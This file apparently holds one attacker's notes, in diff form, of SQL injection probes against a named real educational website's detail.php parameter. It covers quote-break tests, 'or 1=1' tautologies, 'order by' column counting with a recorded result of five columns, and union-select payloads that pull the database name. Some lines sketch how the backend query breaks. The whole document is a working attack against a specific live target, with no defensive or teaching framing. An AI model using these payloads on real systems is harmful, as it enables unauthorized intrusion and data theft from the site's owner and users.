@@ -1,0 +1,25 @@
+https://native.edu.pk/detail.php?ComCatID=26'
+https://native.edu.pk/detail.php?ComCatID=26 or 1=1
+https://native.edu.pk/detail.php?ComCatID=3 or 1=1 -- -
+
+https://native.edu.pk/detail.php?ComCatID=26 order by 1,2,3,4,5 -- -
+
+Total columns: 5
+
+https://native.edu.pk/detail.php?ComCatID=3 union select 1,2,3,4,5 -- -
+
+
+https://native.edu.pk/detail.php?ComCatID=3 union select 1,2,database(),4,5 -- -
+
+
+
+
+
+
+
+select **** from **** where ComCatID=26;
+select **** from **** where ComCatID=26';
+select **** from **** where ComCatID='26'';
+
+https://native.edu.pk/detail.php?ComCatID=26"
+select **** from **** where ComCatID="26"";
